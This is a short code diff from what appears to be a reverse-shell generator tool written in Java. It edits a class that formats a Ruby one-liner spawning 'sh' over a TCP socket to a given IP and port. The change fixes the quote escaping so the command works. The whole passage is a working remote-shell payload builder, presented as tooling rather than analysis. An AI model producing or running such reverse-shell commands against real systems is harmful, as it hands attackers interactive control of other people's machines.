@@ -8,7 +8,7 @@
 
         public Ruby_1(String localIP, int localPort, LISTENER listener, SHELLS shellType){
             super(localIP, localPort, listener, shellType);
-            shellFormat = String.format("ruby -rsocket -e'spawn(\\\"sh\\\",[:in,:out,:err]=>TCPSocket.new(\\\"%s\\\",%s))'",this.getLocalIP() ,this.getLocalPort());
+            shellFormat = String.format("ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"%s\",%s))'",this.getLocalIP() ,this.getLocalPort());
         }
 
         @Override
